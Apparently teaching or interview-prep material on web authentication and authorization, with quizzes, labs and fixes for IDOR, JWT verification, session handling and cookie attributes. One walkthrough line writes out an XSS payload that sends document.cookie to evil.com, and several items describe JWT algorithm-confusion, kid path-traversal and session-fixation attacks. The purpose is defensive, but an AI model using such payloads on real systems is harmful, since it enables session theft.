one: Authentication proves who you are. Authorization decides what you are allowed to do.
an: Showing your passport at the airport is authentication. Your boarding pass deciding which plane and seat is authorization.
how: Authentication: passwords, magic links, OTP, passkeys (WebAuthn), social login, MFA.
Authorization models: RBAC (roles: admin, editor, viewer), ABAC (rules on attributes: owner of this document, same organisation, during work hours), ReBAC (relationships, like Google Drive sharing).
Check authorization on the server for every request, on the specific resource: not just "is logged in" but "may this user read order 42?".
why: Broken access control is #1 on the OWASP Top 10 in both the 2021 and the 2025 editions; in the 2025 data, every tested application had some form of it. The classic bug (IDOR): changing /orders/42 to /orders/43 shows someone else's order.
trade: Centralise authorization checks (a policy layer, row-level security in the DB) so one forgotten check does not leak data.

myth.m: Hiding the admin button in the UI protects the admin feature.
myth.r: Anyone can call the API directly. The server must enforce it.

q.s: GET /api/invoices/:id checks the user is logged in, then returns the invoice. Vulnerability?
o: None
IDOR: any logged-in user can read any invoice by changing the ID
CSRF
XSS
q.e: Check that the invoice belongs to the user (or their organisation) on every request.

Centralised authorization (policy layer) vs scattered checks

lab: In an app with two test users, try fetching user B's resources while logged in as A by changing IDs in URLs and request bodies.
Add an authorization helper (can(user, 'read', invoice)) and use it in every handler; write a test proving A cannot read B's invoice.

plain:
Authentication answers “who are you?” (login, password, code, passkey). Authorization answers “what are you allowed to do?” (can this user see this invoice? delete this post?).

Most serious bugs are authorization bugs: the user is logged in, but the server forgets to check whether this specific thing belongs to them.
bridge: Hiding the “Delete” button for non-admins in React is just UI. Anyone can open DevTools or use curl and call the API directly. The real check must happen on the server for every request.

walk.title: The most common data leak (IDOR)
steps: A user opens their invoice at /api/invoices/1041.
They change the number to 1042 in the URL.
The server checks “is the user logged in?” — yes — and returns invoice 1042, which belongs to another company.
Fix: the query becomes WHERE id = 1042 AND company_id = currentUser.companyId. Not found → 404.
Add a test: user A requesting user B's invoice must get 404. Run it for every endpoint that takes an ID.

terms: Deciding what an identity may do.
Insecure direct object reference: accessing others' data by changing an ID.
Multi-factor authentication: something you know + something you have.
insights: Most access-control bugs are not missing logins. They are a logged-in user reaching a record that is not theirs, so review ID-taking endpoints first.
Permissions copied into a token are a snapshot. Anything that must change quickly (role, company membership) is checked server-side on sensitive calls.
Every new way to reach data (GraphQL fields, file downloads, CSV exports, admin tools) needs the same scope rule, not only the main REST routes.

prod.summary: In production, authentication is usually bought (an identity provider or a library); authorization is always your own code, and that is where the leaks are. Seniors look for one rule: every handler that takes an ID loads the record through the current user's scope (user or tenant), and a test proves that user A gets 404 on user B's data.
checklist: Every query that loads a record by ID also filters by owner or tenant (WHERE id = $1 AND org_id = $2), not “load, then maybe check”.
Authorization lives in one place (a can() helper, policy engine or Postgres RLS), not copied into each route.
Return 404 (not 403) for records the user may not see, so attackers cannot discover which IDs exist.
IDs in request bodies are checked too ({ "accountId": 7 } in a PATCH is as dangerous as one in the URL).
Admin endpoints are protected on the server and by a separate role, not by a hidden menu item.
Integration tests with two users and two tenants run in CI for every endpoint that takes an ID.
Account recovery (password reset, email change) needs the same strength as login, plus MFA re-check for sensitive changes.
numbers: OWASP Top 10:2025 maps 40 CWEs to A01 Broken Access Control, and it now includes SSRF (CWE-918) and CSRF (CWE-352).
In the OWASP 2025 data, 100% of tested applications had some form of access control failure.
HTTP: 401 means “not authenticated” (no or bad credentials); 403 means “authenticated, but not allowed”.
failures: Bug bounty report: “I can download any invoice PDF by changing the number in /invoices/1042.pdf.”
The file route checks only the session. Load the invoice with the user's org ID in the WHERE clause, return 404 if not found, and add a two-tenant test for that route.
Support sees a normal user who changed their own role to admin.
Mass assignment: the profile PATCH saved the whole request body ({ ...req.body }). Allowlist editable fields with a schema (zod) and never let a user write role, org or owner fields.
After moving a user to another company, they still see the old company's data for an hour.
Permissions were copied into a long-lived JWT. Keep authorization data server-side, or use short-lived tokens and re-check membership on sensitive calls.
A GraphQL query { user(id: 9) { invoices { total } } } returns another customer's invoices.
Checks were on top-level resolvers only. Nested resolvers and field resolvers need the same scope; put checks in the data-loading layer, not in resolvers.

code.title: Scope the query, do not check after loading
code.note: The orgId filter inside where is the fix. A missing check now returns nothing instead of leaking data.

qs.s: A PATCH /api/profile handler runs db.user.update({ where: { id: req.user.id }, data: req.body }). The ownership check is correct. What is still wrong?
o: Nothing, the user can only update their own row
PATCH should be PUT
Mass assignment: a user can send { "role": "admin" } or { "orgId": 5 } and change protected fields
It needs a CSRF token, otherwise it is fine
qs.e: The row is right, but the fields are not controlled. Validate the body against an allowlist schema of editable fields. CSRF protection may also be needed, but it does not stop the user from attacking their own account.

qs.s: Your API returns 403 Forbidden when a user asks for an invoice that belongs to another company, and 404 when the ID does not exist. Why might a security review flag this?
o: 403 is the wrong code for logged-out users
404 responses are cached by CDNs
The difference tells attackers which IDs exist, so they can enumerate other customers' records
It is fine; 403 is the correct code here
qs.e: Different answers leak existence. For resources a user should not even know about, return 404 for both cases. 403 is fine when the user knows the resource exists but lacks the permission (e.g. a viewer trying to edit).

qs.s: A team stores role and orgId inside a 24-hour JWT and checks them in each service. An admin removes a user from the company. What happens?
o: The user loses access at once because the database changed
The user keeps the old role and org access until the token expires, up to 24 hours
The JWT signature becomes invalid
Only the refresh token keeps working
qs.e: Claims in a JWT are a snapshot from when it was issued. Use short-lived access tokens, or look up membership server-side for sensitive actions.

qs.s: Read this handler. The project lookup is scoped to the user's organisation. What can a logged-in attacker still do?

code.title: routes/files.ts

o: Nothing; the project check already proves the user belongs to the right org
Delete any file in any org: send their own project ID together with a file ID from another org
Only cause a CSRF attack, because DELETE has no CSRF token
Learn which projects exist, because it returns 404 instead of 403
qs.e: The check proves the user may touch that project, but the delete never ties the file to the project. Scope the write too: db.file.deleteMany({ where: { id: fileId, projectId: project.id } }) and return 404 when the count is 0. The 404 is correct behaviour, not a leak. CSRF is a separate question that depends on how the session is sent.

qs.s: A support engineer pastes these access logs from the last 6 minutes. What happened, and what is the right first response?

code.title: access.log (excerpt)
code.src:
10:02:11 GET /api/users/1001/export 200 3.1KB session_user=1001
10:02:11 GET /api/users/1002/export 200 2.8KB session_user=1001
10:02:12 GET /api/users/1003/export 200 4.0KB session_user=1001
10:02:12 GET /api/users/1004/export 200 1.9KB session_user=1001
...  4,812 more lines, ids 1005-5816, all 200, all session_user=1001

o: An IDOR: user 1001 is downloading other users' exports. Fix the route to load by the session user, then use these logs to list exactly whose data left, for incident response and notification
A rate-limit problem: add a limit of 100 requests per minute and the issue is solved
Normal behaviour: the client paginates through user IDs
A bot problem: block the IP address and close the ticket
qs.e: Every line is 200 while the path ID differs from the session user: the server never checked ownership. A rate limit or IP block only slows the next attacker; the missing check is the bug. The logs are now evidence: they tell you which records leaked, which you need for legal notification (GDPR Article 33 gives 72 hours to tell the regulator).

qs.s: Users can belong to several organisations. The frontend sends the active org in a header, X-Org-Id: 77, and every query uses WHERE org_id = $header. What is still required?
o: Nothing; every query is scoped by org
Sign the header value in the frontend so it cannot be changed
On every request, check on the server that the session user is a member of org 77 (and with which role) before using it
Store the org ID in localStorage instead of a header
qs.e: The header is user input. Scoping queries by an org the user chose is only safe if the server first proves membership. Signing in the frontend is useless because the key would be in the browser. Load memberships server-side (cache briefly if needed) and reject unknown orgs with 404.

qs.s: A Next.js page shows the “Delete” button only to admins. The button calls this Server Action. What is the risk?

code.title: app/invoices/actions.ts

o: None: Server Actions can only be called from the component that imports them
None: Next.js checks the Origin header, so outsiders cannot call it
Only CSRF, which Next.js already handles
A Server Action is a public POST endpoint. Any user (or anyone, if there is no session check) can call it with any ID. Check the session and the user's permission on that invoice inside the action
qs.e: Next.js turns each Server Action into an HTTP endpoint that anyone can call with crafted arguments. The Origin check stops cross-site calls, not a logged-in user (or a script) calling it directly. Treat every action like an API route: authenticate, authorize on the specific record, validate input.

interview.q: How would you design authorization for a multi-tenant B2B SaaS so that one forgotten check cannot leak another customer's data?
answer: Make tenant scoping structural, not optional: a data-access layer that requires a tenant ID for every query, or Postgres RLS with the tenant set per transaction (SET LOCAL), so a missing filter returns nothing instead of everything.
One policy function (can(user, action, resource)) or a policy engine, deny by default, used by every handler, job and Server Action, not copied if statements.
Return 404 for records outside the tenant, so IDs cannot be enumerated; check IDs in bodies and nested resources too.
Two-tenant integration tests in CI for every route that takes an ID; ideally generated from the route list so new routes are covered automatically.
Trade-off: RLS is strong but harder to debug and needs care with connection pools and bypass roles; an app-layer guard is easier to test but can be bypassed by raw queries.
Audit log support and admin access to tenant data, with a reason.
followups: How do support staff see a customer's data without breaking these rules?
What changes when one user can belong to many organisations?

interview.q: Walk me through a request from a logged-in user to an API that returns their order. Where exactly do authentication and authorization happen?
answer: Authentication: the request carries a session cookie or bearer token; middleware verifies it (session lookup, or JWT signature, issuer, audience, expiry) and produces a user identity. Failure is 401.
Coarse authorization: does this user have the permission at all (role or scope, e.g. orders:read)? Failure is 403.
Fine-grained authorization: may this user read this order? Done by loading the order through the user's scope (WHERE id = $1 AND customer_id = $2); not found is 404.
Response shaping is also authorization: do not return fields the user may not see (internal notes, other users' emails).
Most real bugs are in the fine-grained step, because frameworks give you the first two for free.
followups: Where would you put the fine-grained check in a GraphQL API?
When is 403 better than 404?

interview.q: A bug bounty hunter reports an IDOR in production. What do you do in the first 24 hours?
answer: Confirm and fix fast: scope the query, deploy, and add a regression test with two users or tenants.
Search for the same pattern elsewhere (same developer, same helper, same ORM call) instead of fixing one route.
Use access logs to check if it was exploited before the report: requests where the resource owner differs from the session user, unusual ID sequences, volume.
Decide with legal/security if it is a personal data breach; under GDPR the regulator must be told within 72 hours of becoming aware.
Write a short post-incident review: why no test or review caught it, and what structural change (scoped data layer, RLS, lint rule) prevents the class.
followups: What if the logs do not record which user made each request?
How do you pay and communicate with the researcher?

one: Two ways to remember a logged-in user. Server sessions store state server-side with an ID in a cookie; JWTs are signed tokens carrying the claims themselves.
an: A session is a coat-check ticket: the number means nothing alone; the counter holds the coat. A JWT is a signed letter of introduction: anyone can read it, nobody can forge it, and you cannot un-send it.
how: Session: random ID in an HttpOnly; Secure; SameSite cookie → server looks up the session in DB/Redis. Logout or ban = delete the row, instantly effective.

JWT: header.payload.signature, base64-encoded (not encrypted). Server verifies the signature without a DB lookup. Revocation is hard until it expires, so use short-lived access tokens (5–15 min) plus refresh tokens that can be revoked.
Where to store in the browser: localStorage is readable by any XSS script; HttpOnly cookies are not readable by JS (but need CSRF protection).
why: This choice affects security, scalability and logout behaviour. It is asked in nearly every full-stack interview.
trade: For a typical web app with one backend, cookie sessions are simpler and safer. JWTs shine for stateless verification across many services or third parties.

myth.m: JWTs are encrypted, so I can put sensitive data in them.
myth.r: Anyone can base64-decode the payload. The signature only proves it was not modified.

q.s: A user's account is compromised. With 24-hour JWT access tokens and no revocation list, how long can the attacker keep using a stolen token?
o: Until you change the user's password
Up to 24 hours, until it expires
Zero, logout kills it
Forever
q.e: Stateless tokens stay valid until expiry. Short lifetimes plus revocable refresh tokens limit the damage.

Session fixation and regenerating IDs on login

Build login with a server session in Redis and an HttpOnly cookie. Implement logout-everywhere by deleting all sessions for a user.
Build the same with a 10-minute access JWT + rotating refresh token, and compare the code.

plain:
After login, the server needs to recognise you on later requests. Two main ways.

Session: the server stores “session abc → user 42” and gives the browser a cookie with abc. Logging out deletes the session; it stops working instantly. JWT: the server gives you a signed token that itself says “user 42, expires 15:00”. The server can verify it without a database lookup, but cannot easily cancel it before it expires.
bridge: Supabase and Firebase give your frontend a JWT access token plus a refresh token. A classic Express or Rails app usually uses a session cookie. Both are valid; they trade different things.

walk.title: A stolen token: session vs JWT
steps: An attacker steals a user's credential (for example, from malware on the user's laptop).
Session: the user changes password or the admin clicks “log out all devices”. The server deletes the sessions. The stolen cookie stops working immediately.
JWT valid for 24 hours: the server has nothing to delete. The stolen token keeps working until it expires.
Common JWT fix: short access tokens (5–15 minutes) plus a refresh token stored server-side that can be revoked.
Now a stolen access token works for at most 15 minutes, and the refresh token can be cancelled.

terms: Server-side record of a login, identified by a random ID in a cookie.
JSON Web Token: a signed (not encrypted) token carrying claims.
Short-lived token for API calls / longer-lived token to get new access tokens.
The data inside a JWT, like user ID and expiry.
insights: The real question is not “session or JWT” but “how fast does a stolen credential stop working?”. Answer it in minutes for your app.
Stateless JWTs become stateful again as soon as you need instant bans or logout (a deny-list or a revocable refresh token). Plan for that from day one.
Where the credential travels decides the attack surface: cookies need CSRF defences; tokens that JavaScript can read need XSS to never happen.

prod.summary: Most production web apps end up with a hybrid: a server-side session (or a revocable refresh token) for the browser, and short-lived signed tokens between services. Seniors check three things: how fast a stolen credential stops working, where the token lives in the browser, and that JWT verification pins the algorithm and checks issuer, audience and expiry.
checklist: Session IDs come from a CSPRNG (OWASP minimum is 64 bits of entropy; 128 bits is the usual choice), and a new ID is issued on login (prevents session fixation).
Logout and password change delete server-side sessions or refresh tokens for that user (“log out all devices” really works).
JWT verification pins the algorithm (algorithms: ['RS256'] or ['EdDSA']) and checks exp, iss and aud.
Access tokens live 5–15 minutes; refresh tokens rotate on every use and reuse of an old one revokes the whole family.
Tokens are not stored in localStorage for high-value apps; use HttpOnly cookies or keep the token in memory.
Both idle timeout and absolute timeout are set (e.g. 30 min idle, 7–30 days absolute, depending on risk).
Signing keys can rotate: the verifier reads keys by kid from a JWKS endpoint and keeps the old key until old tokens expire.
numbers: OWASP Session Management Cheat Sheet: session IDs need at least 64 bits of entropy; 128-bit random IDs are the common choice.
RFC 8725 (JWT Best Current Practices) says verifiers must check the algorithm and must not trust the alg header alone.
Supabase Auth's default access-token (JWT) lifetime is 3600 seconds (1 hour); Auth0's default access-token lifetime for APIs is 86,400 seconds (24 hours).
failures: “User was banned but still posts for another 20 minutes.”
Access JWTs are valid until exp. Shorten their lifetime, revoke the refresh token on ban, and check a small deny-list (by user ID or jti) in Redis for high-risk actions.
Logs show a token with "alg": "none" or an HS256 token signed with the public key being accepted.
The verifier trusted the alg header. Pass an explicit algorithm list to the verify call and use separate keys per algorithm.
Random 401s right after a deploy, only for some users.
Signing key rotated without publishing the new key in JWKS first, or with only one key accepted. Publish new key, wait for caches, then start signing, and keep the old key until old tokens expire.
Refresh token theft is noticed only weeks later.
No rotation. Rotate refresh tokens on each use and treat the reuse of an already-used token as theft: revoke every token in that family and force re-login.

code.title: Verify a JWT strictly with jose
code.note: algorithms, issuer and audience are the lines that are often missing. Without audience, a token minted for a different API of the same provider is accepted.

qs.s: Your mobile app and web app share one API. The web team proposes a 30-day JWT access token “so users never get logged out”. What is the better design?
o: Keep it, but encrypt the JWT
Short access tokens (around 10 minutes) plus a rotating refresh token that the server can revoke
Use a 30-day token but check the user in the database on every request
Store the 30-day token in sessionStorage instead
qs.e: Users stay logged in through refresh, while a stolen access token is useful for minutes. Checking the database on every request also works, but then you have a session with extra steps.

qs.s: A service verifies JWTs with jwt.verify(token, publicKey) and no options. An attacker sends a token with alg: HS256 signed using your public RSA key as the HMAC secret. Older libraries accepted this. What is the fix?
o: Keep the public key secret
Switch to a longer RSA key
Pin the allowed algorithms (e.g. ['RS256']) in the verify call
Add an expiry check
qs.e: This is algorithm confusion. The public key is public by design, so hiding it is not a fix. Pinning the algorithm makes the verifier refuse HS256 entirely.

qs.s: Refresh-token rotation is on. Your logs show refresh token R1 being used twice: once from the user's phone and once, 10 minutes later, from an unknown IP. What should the server do?
o: Accept both, refresh tokens are long-lived
Block only the unknown IP
Ask the second caller for the password
Treat it as theft: revoke the whole token family so both the attacker and the user must log in again
qs.e: With rotation, a used refresh token must never come back. Its reuse means a copy exists. You cannot tell which caller is real, so revoke everything in that family. IP blocking is easy to bypass.

qs.s: Read this Express middleware. Requests with a valid login work. What is the security problem?

code.title: middleware/auth.ts

o: It does not check exp, but otherwise it is safe
split(' ')[1] should be [0]
jwt.decode does not verify the signature, so anyone can write a token with "sub": "1" or "role": "admin" and it is accepted
decode throws on tampered tokens, so the catch block protects it
qs.e: decode only base64-decodes; it never throws on a bad signature. Use jwt.verify(token, key, { algorithms: ['RS256'], issuer, audience }) (or jose's jwtVerify). Missing exp is a real but smaller issue; verify checks it for you.

qs.s: Access tokens live 15 minutes; refresh tokens rotate and can be revoked. A user's access token was stolen and issued 4 minutes ago. The user clicks “Log out all devices”, which revokes all refresh tokens. How long can the attacker still call the API, at most, if the API only verifies JWT signatures?
o: 0 minutes
About 11 minutes
15 minutes
Until the refresh token's 30-day expiry
qs.e: The access token stays valid until its exp: 15 − 4 = 11 minutes. Revoking refresh tokens stops new access tokens, not existing ones. If 11 minutes is too long for some actions, check a deny-list (by user or jti) on those routes, or shorten the access-token lifetime.

qs.s: You find this decoded JWT header in your logs. Your verifier reads the signing key with fs.readFileSync(`keys/${header.kid}`). What is wrong, and what is the fix?
o: Nothing; the signature check still protects you
HS256 is too weak; switch to HS512 and keep the same lookup
Only the typ value is suspicious
kid is attacker input used as a file path, so the attacker chooses the key (here, an empty file) and can sign their own tokens. Look up kid in a fixed key set (JWKS map) and pin the algorithm
qs.e: The token tells the server which key to use, so letting it pick a file (or SQL row) lets the attacker pick a key they know. kid must only select from keys you loaded yourself, and the allowed algorithm must be fixed in code. A longer hash does not help when the attacker controls the key.

qs.s: Read this login handler (express-session). What attack does it allow?

code.title: routes/login.ts

o: Session fixation: if an attacker planted a known session ID in the victim's browser before login, that ID now belongs to the victim's logged-in session. Call req.session.regenerate() before setting userId
CSRF on the redirect
None; express-session generates random IDs
SQL injection through the email field
qs.e: Random IDs do not help if the ID is not changed when the privilege level changes. Regenerate on login (and on privilege changes like sudo mode), then save the session before redirecting. A host-only __Host- cookie also makes planting a cookie harder.

interview.q: New product: React frontend, one Node API, same domain. Would you use server sessions or JWTs? Defend it.
answer: Default: server-side sessions in Redis or Postgres with an HttpOnly; Secure; SameSite=Lax cookie. Instant logout and ban, small cookie, no token handling in JS.
Cost: one fast lookup per request (Redis is under a millisecond) and a shared session store, which is fine for one API.
JWTs make sense when many services or third parties must verify identity without calling a central store, or for mobile/API clients; then use short access tokens plus rotating refresh tokens.
Whatever you pick: CSRF protection for cookies, regenerate the ID on login, idle and absolute timeouts, and a tested “log out all devices”.
Avoid “JWT in localStorage” for high-value apps: any XSS can steal it.
followups: What changes if a mobile app uses the same API?
How would you scale the session store?

interview.q: How do you implement “log out of all devices” when your API uses JWT access tokens?
answer: Store refresh tokens (or token families) server-side and delete all of them for the user; no new access tokens can be minted.
Existing access tokens live until exp, so keep them short (5–15 minutes).

For instant effect, keep a per-user “tokens issued before T are invalid” timestamp in Redis and compare with iat, or a jti deny-list for single tokens; check it on sensitive routes or everywhere if the cost is acceptable.
At that point you have partly rebuilt sessions; say that trade-off out loud.
Test it: log in on two devices, revoke, confirm both stop within the expected window.
followups: How big does the deny-list get, and how do you expire entries?
What happens to WebSocket connections that were opened with the old token?

interview.q: Twenty services verify JWTs from one auth service. How do you rotate the signing key without downtime?
answer: Use asymmetric keys (RS256, ES256 or EdDSA) so services only hold public keys, and publish them as a JWKS with a kid per key.
Step 1: add the new public key to the JWKS while still signing with the old one. Wait longer than the verifiers' JWKS cache time.
Step 2: start signing with the new key (new kid).
Step 3: keep the old public key until the longest-lived token signed with it has expired, then remove it.
Verifiers pin allowed algorithms and refetch the JWKS on an unknown kid (with a rate limit), which is what jose's createRemoteJWKSet does.
For an emergency rotation (leaked key), remove the old key at once and accept that users must log in again.
followups: Why not HS256 with a shared secret here?
Where does the private key live?

sequenceDiagram

  participant API

one: Flags that control where cookies are sent and who can read them: HttpOnly, Secure, SameSite, Domain, Path, expiry.
an: Instructions printed on a key: do not copy, only use at the front door, only use when arriving from the street.
how: HttpOnly: JavaScript cannot read it (protects the session from XSS theft). Secure: only sent over HTTPS.

SameSite=Lax: not sent on cross-site subrequests like a POST from another site, but sent on top-level GET navigation. Strict: never sent cross-site. None: always sent (requires Secure). If you omit SameSite, Chrome and Edge treat the cookie as Lax, but Firefox and Safari do not, so always set it explicitly.
Domain and Path scope where the cookie goes. Leaving Domain out makes a host-only cookie (safer). The __Host- name prefix forces Secure, Path=/ and no Domain.

Third-party cookies (set by a site embedded in another site): Safari blocks them by default, Firefox keeps them but partitions them per top-level site (Total Cookie Protection), and Chrome still allows them unless the user blocks them. Do not build new features on them.
why: Most session theft and CSRF defences come down to these attributes being set correctly.
trade: Cross-site setups (API on another domain, embedded iframes) need SameSite=None, which reopens CSRF risk. Serving app and API from the same site avoids it.

myth.m: HTTPS alone protects the session cookie.
myth.r: Without HttpOnly, any XSS can read it. Without Secure, it can leak over an accidental HTTP request.

q.s: Recommended attributes for a session cookie on a same-site web app?
o: None
HttpOnly; Secure; SameSite=Lax (or Strict)
SameSite=None only
Readable by JS for convenience
q.e: Not readable by scripts, HTTPS-only, not attached to cross-site POSTs.

more: Cookie size limits and many cookies per request
lab: Set cookies with each attribute combination from a local server and inspect them in DevTools → Application → Cookies.
Prove HttpOnly works: try document.cookie in the console.
From a page on a different port/site, POST to your server and see which cookies are attached under SameSite=Lax vs None.

plain:
Cookies are small values the browser stores and automatically sends back to the server. For login cookies, a few attributes decide how safe they are.

HttpOnly: JavaScript cannot read it. Secure: only sent over HTTPS. SameSite: whether it is sent when another website triggers the request.
bridge: Open DevTools → Application → Cookies on any site you are logged into. The columns HttpOnly, Secure and SameSite are exactly these settings.

walk.title: Why each attribute matters
steps: Without HttpOnly: an injected script runs fetch('https://evil.com?c=' + document.cookie) and steals the session.
With HttpOnly: document.cookie does not include it. The script cannot read it.
Without Secure: if the user ever loads an http:// page of your site (public Wi-Fi), the cookie travels unencrypted.
Without SameSite: a hidden form on evil.com can POST to your site and the browser attaches the login cookie.
Recommended: Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax; Path=/.

terms: Lax/Strict/None: controls sending on cross-site requests.
Set by the site you are on / by another site embedded in it.
insights: Most cookie bugs appear only in production: TLS ends at a proxy, the API is on another domain, a payment provider posts back. Test login through the real proxy and the real cross-site flows before launch.
Every extra cookie and every wide Domain widens what an XSS or a forgotten subdomain can touch. Few cookies, host-only, with the __Host- prefix, is the safe default.
Third-party cookie rules differ by browser and keep changing; design embeds and cross-site logins so they still work without them.

prod.summary: In production, a session cookie is one header line, and most mistakes are in that line: a missing attribute, a Domain that is too wide, or SameSite=None added to “fix” a cross-site setup. Seniors check the real Set-Cookie response header in DevTools, not the framework config, because proxies and frameworks change it.
checklist: Session cookie: __Host-session=…; HttpOnly; Secure; SameSite=Lax; Path=/, with no Domain attribute.
SameSite is set explicitly; you do not rely on browser defaults, which differ between Chrome and Firefox/Safari.
Behind a TLS-terminating proxy, the app trusts X-Forwarded-Proto (e.g. Express app.set('trust proxy', 1)) or Secure cookies are silently not set.
No secrets or personal data in non-HttpOnly cookies; anything JS can read, an XSS can read.
Domain=.example.com only when you truly need subdomain sharing, because every subdomain (including a forgotten marketing site) can then read and overwrite it.
Cookie expiry matches the session policy, and logout sends an expired Set-Cookie with the same name, path and domain.
Total cookie size per request stays small (a few KB); large cookies slow every request and can hit header limits.
numbers: Chrome caps cookie lifetime at 400 days, following the RFC 6265bis draft, even if you set Max-Age longer.
When Chrome applies Lax by default (no SameSite set), it still sends the cookie on top-level cross-site POSTs for 2 minutes after it was set (the “Lax+POST” exception).
Per RFC 6265, browsers must support at least 4096 bytes per cookie and 50 cookies per domain.
nginx's default large_client_header_buffers is 4 × 8k, so a single header line (including Cookie) over 8 KB gets a 400 Request Header Or Cookie Too Large.
failures: Login works on localhost but in production the user is logged out after every redirect.
The app is behind a load balancer on HTTP, so the framework thinks the request is insecure and does not set the Secure cookie. Enable trust-proxy handling of X-Forwarded-Proto.
“Session lost after returning from the payment provider” (a cross-site POST back to your site).

SameSite=Strict or Lax drops the cookie on that cross-site POST. Make the return URL a GET that reloads state, or use a separate short-lived cookie for that flow. Do not switch the main session to None.
Users get 400 Request Header Or Cookie Too Large from nginx.
Too many or too big cookies (analytics, A/B test, a JWT with many claims). Remove unused cookies, keep the session cookie small, or raise large_client_header_buffers as a short-term fix.
Logout does not log out: the cookie is still there.
The clearing Set-Cookie used a different Path or Domain, so the browser treats it as a different cookie. Clear it with exactly the same attributes, and delete the server-side session too.

code.title: A hardened session cookie in Express
code.note: The __Host- prefix makes the browser reject the cookie if Secure, Path=/ or the missing Domain rule is broken, so a subdomain cannot plant or overwrite it.

qs.s: Your app runs on app.example.com. A marketing site on blog.example.com uses a third-party CMS with a known XSS. Your session cookie is set with Domain=.example.com; HttpOnly; Secure; SameSite=Lax. What is the risk?
o: None, HttpOnly blocks everything
SameSite=Lax blocks the blog from sending it
The blog cannot be same-site with the app
Script on the blog can overwrite or plant a cookie with the same name for the whole domain (cookie tossing), e.g. for session fixation
qs.e: HttpOnly stops reading, not overwriting. Subdomains are same-site, so SameSite does not help. Drop the Domain attribute (host-only) or use the __Host- prefix.

qs.s: A cookie is set without a SameSite attribute. A user on Firefox visits an attacker page that auto-submits a POST form to your site. Is the cookie sent?
o: Yes; Firefox and Safari do not apply Lax by default, so it behaves like SameSite=None
No, all browsers default to Lax since 2020
Only if the request is a GET
No, because Firefox blocks all cross-site POSTs
qs.e: Only Chromium browsers apply Lax-by-default. This is why you set SameSite explicitly instead of relying on defaults.

qs.s: An SPA on app.example.com calls an API on api.example.com with fetch(url, { credentials: 'include' }). Which SameSite value does the session cookie need?
o: SameSite=None, because the hosts are different
Lax or Strict works, because these two hosts are the same site (same registrable domain); you need CORS with credentials, not SameSite=None
SameSite is ignored for fetch
Only Strict works for subdomains
qs.e: “Site” means scheme + registrable domain, so app.example.com and api.example.com are same-site. CORS (origin) and SameSite (site) are different checks; people often confuse them and weaken the cookie to None for no reason.

qs.s: Your server sends this header after login. Users report they are “not logged in” right after logging in. Why?

code.title: Response
code.src:
HTTP/1.1 204 No Content
Set-Cookie: __Host-sid=k8Jd2...; Path=/; Secure; HttpOnly; SameSite=Lax; Domain=app.example.com

o: The browser stores it as a host-only cookie and ignores Domain
The cookie is fine; the problem must be on the server
The browser rejects the whole cookie: the __Host- prefix forbids any Domain attribute, even one equal to the current host
SameSite=Lax blocks it after a redirect
qs.e: Prefix rules are strict: a __Host- cookie must have Secure, Path=/ and no Domain, or it is silently dropped. Remove the Domain attribute. Check DevTools → Network → the response's cookies tab; it shows why a cookie was blocked.

qs.s: Your SPA on app.example.com calls the API on api.example.com. The session cookie is set for Domain=example.com with SameSite=Lax. Every call returns 401. Why?

code.title: api-client.ts

o: fetch defaults to credentials: 'same-origin', so cookies are not sent to another origin. Add credentials: 'include', and the API must answer with an exact Access-Control-Allow-Origin plus Access-Control-Allow-Credentials: true
SameSite=Lax blocks cookies between subdomains; change it to None
Cookies never work across subdomains; use localStorage
The API needs a CSRF token on GET requests
qs.e: The two hosts are same-site, so SameSite is not the problem; they are different origins, and fetch only sends cookies cross-origin when you ask. With credentials, CORS cannot use *; it must echo an allowed origin from an allowlist.

qs.s: You switched the session cookie to SameSite=Strict. Now users who click a link to your app from Slack or email land on the login page, but pressing refresh shows them logged in. What is going on, and what is the usual fix?
o: Slack strips cookies; nothing can be done

Strict cookies are not sent on a top-level navigation that starts from another site, so the first request has no session. Use Lax for the session cookie (and keep GET handlers free of side effects), or add a separate Strict cookie only for sensitive actions
The cookie expired; increase Max-Age
The browser cache served an old page; add Cache-Control: no-store
qs.e: Strict means “never cross-site”, including normal link clicks. The refresh is same-site, so the cookie appears. Lax is the usual session setting because it allows top-level GET navigation; protect state changes with POST plus CSRF checks.

qs.s: Your app on app.example.com and an admin tool on admin.example.com must share one login cookie. Which choice is correct, and what does it cost?
o: Use __Host-sid with Domain=example.com
Use two __Host- cookies and copy the value with JavaScript
Set SameSite=None so the subdomains can share it

Use __Secure-sid; Domain=example.com. It works, but every subdomain (including old or third-party-hosted ones) receives it and can overwrite it, so audit subdomains, or better, serve both tools from one host with different paths
qs.e: __Host- cannot have a Domain, so it cannot be shared. Sharing needs Domain=example.com, which widens the attack surface to every subdomain. SameSite is about cross-site requests and has nothing to do with sharing between subdomains.

interview.q: Design the session cookie for an app at app.example.com with its API at api.example.com. Explain each attribute.
answer: Prefer one origin: serve the API under app.example.com/api through a proxy. Then use __Host-sid=…; HttpOnly; Secure; SameSite=Lax; Path=/ and no CORS at all.
If two hosts are required: __Secure-sid; Domain=example.com, still HttpOnly and SameSite=Lax (they are same-site), plus CORS with an exact origin allowlist and credentials.
HttpOnly against XSS theft; Secure against plain-HTTP leaks; SameSite against most CSRF; host-only or __Host- against cookie tossing from sibling subdomains.
Session lifetime: idle and absolute timeouts on the server; cookie Max-Age matching it (Chrome caps at 400 days anyway).
Behind a TLS-terminating proxy, configure trust-proxy so the framework actually sets Secure cookies.

What changes if a mobile app uses the same API?

interview.q: Explain “same-site” versus “same-origin”. Why does the difference matter for cookies and CSRF?
answer: Origin = scheme + host + port. Site = scheme + registrable domain (eTLD+1), so app.example.com and blog.example.com are different origins but the same site.
SameSite cookie rules work on sites; CORS and the same-origin policy work on origins.
So a compromised sibling subdomain is “same-site”: SameSite cookies are sent with its requests. Origin or Sec-Fetch-Site: same-origin checks, or CSRF tokens, close that gap.
The Public Suffix List defines registrable domains: a.github.io and b.github.io are different sites.
Common mistake: weakening cookies to SameSite=None to fix what is really a CORS credentials problem.
followups: Is http://example.com same-site with https://example.com?
What does Sec-Fetch-Site: same-site tell your server?

interview.q: Third-party cookies are restricted in most browsers. How would you build an embeddable widget that needs a logged-in user?
answer: Do not depend on a classic third-party cookie: Safari blocks it and Firefox partitions it.
Option: the Storage Access API (document.requestStorageAccess() after a user gesture) to get the unpartitioned cookie, with browser-specific prompts.
Option: partitioned cookies (CHIPS, the Partitioned attribute) for state that only needs to live inside one embedding site.
Option: a popup login on your origin that hands a short-lived token to the iframe with postMessage, with strict origin checks on both sides; keep it in memory.
Set frame-ancestors to the customer domains that may embed you, to prevent clickjacking.
followups: How do you test this across browsers?
What does the customer's CSP need to allow?

